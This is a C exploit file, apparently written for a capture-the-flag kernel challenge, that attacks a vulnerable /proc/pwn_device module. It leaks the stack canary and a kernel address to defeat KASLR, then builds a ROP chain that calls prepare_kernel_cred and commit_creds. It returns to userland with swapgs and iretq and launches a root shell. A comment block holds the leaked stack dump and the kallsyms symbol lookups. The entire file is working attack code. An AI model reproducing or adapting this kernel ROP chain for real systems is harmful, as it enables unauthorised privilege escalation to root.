#include <stdio.h>
#include <stdlib.h>
#include <fcntl.h>
#include <signal.h>

char buf[0x200];

void get_shell(void){
    puts("[*] Returned to userland");
    if (getuid() == 0){
        printf("[*] UID: %d, got root!\n", getuid());
        system("/bin/sh");
        exit(1337);
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}

long user_cs;
long user_ss;
long user_sp;
long user_rflags;
void save_state(){
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[*] Saved state");
}

int main()
{
	save_state();
	int fd = open("/proc/pwn_device", O_RDWR);
	signal(SIGSEGV, get_shell);
	read(fd, buf, 0x100);
	long canary = *(long *)(buf+16*8);
	long leak = *(long *)(buf+21*8);
	long kernel_base = leak - 0x1c89f8;
	long prepare_kernel_cred = leak - 0x140838;
	long commit_creds = leak - 0xffffffff8dbc89f8 + 0xffffffff8da87e80;
	// 0xffffffff81001518 : pop rdi ; ret
	long pop_rdi = kernel_base + 0x1518;
	// 0xffffffff81034b72 : pop rdx ; ret
	long pop_rdx = kernel_base + 0x34b72;
	// 0xffffffff81a30061 : cmp rdx, 8 ; jne 0xffffffff81a3003e ; ret
	long cmp_gadget = kernel_base + 0xa30061;
	// 0xffffffff813b3504 : mov rdi, rax ; jne 0xffffffff813b34f1 ; xor eax, eax ; ret
	long mov_rdi_rax = kernel_base + 0x3b3504;
	// 0xffffffff81c00eaa : swapgs ; popfq ; ret
	long swapgs = kernel_base + 0xc00eaa;
	long iretq = kernel_base + 0x23cc2;
	// printf("%p %p", canary, leak);
	// for (int i=0 ; i<0x100/8 ; i++ )	printf("%2d: %p\n", i, *(long *)(buf+i*8));
	// printf("\n");

	ioctl(fd, 0x20, 0x1000);
	
	unsigned long ropper[0x100] = {prepare_kernel_cred};
	int i = 16;
	ropper[i++] = canary;
	ropper[i++] = 0x100;
	ropper[i++] = pop_rdi;
	ropper[i++] = 0;
	ropper[i++] = prepare_kernel_cred;
	ropper[i++] = pop_rdx;
	ropper[i++] = 8;
	ropper[i++] = cmp_gadget;
	ropper[i++] = mov_rdi_rax;
	ropper[i++] = commit_creds;
	ropper[i++] = swapgs;
	ropper[i++] = 0x1337;	// popfq thingy to be popped
	ropper[i++] = iretq;
	ropper[i++] = get_shell;
    ropper[i++] = user_cs;
    ropper[i++] = user_rflags;
    ropper[i++] = user_sp;
    ropper[i++] = user_ss;

	write(fd, (char *)ropper, 0x180);
	
	return 0;
}
/*
 0: 0x20656d6f636c6557
 1: 0x2073696874206f74
 2: 0x70206c656e72656b
 3: 0x6569726573206e77
 4: 0xffff89f400820073
 5: 0x20000031a9000
 6: 0xffff89f40082bd10
 7: 0x100020000
 8: (nil)
 9: 0xffff89f400000000
10: (nil)
11: (nil)
12: (nil)
13: (nil)
14: 0x37cd111767c67400
15: 0x100
16: 0x37cd111767c67400
17: 0x100
18: 0xffffffff8dc3e347
19: 0x1
20: (nil)
21: 0xffffffff8dbc89f8
22: 0xffff89f40082bd00
23: 0xffff89f40082bd00
24: 0x4c5460
25: 0x100
26: (nil)
27: (nil)
28: 0xffffffff8dbc8d1a
29: (nil)
30: 0x37cd111767c67400
31: (nil)

[    6.784222] All device's closed
~ # cat /proc/kallsyms | grep prepare_kernel_cred
ffffffff8da881c0 T prepare_kernel_cred
~ # cat /proc/kallsyms | grep commit_cred
ffffffff8da87e80 T commit_creds
*/